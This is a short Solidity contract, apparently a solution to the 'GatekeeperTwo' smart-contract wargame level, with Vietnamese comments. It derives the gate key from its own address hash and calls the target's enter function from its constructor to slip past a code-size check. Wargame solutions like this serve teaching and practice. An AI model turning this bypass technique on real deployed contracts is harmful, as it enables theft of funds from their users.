// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack {
    IGatekeeperTwo public target;

    constructor(address targetAddress) {
        target = IGatekeeperTwo(targetAddress);
        
        // Tính toán gateKey để vượt qua gateThree
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);

        // Gọi enter trong hàm khởi tạo
        target.enter(gateKey);
    }
}
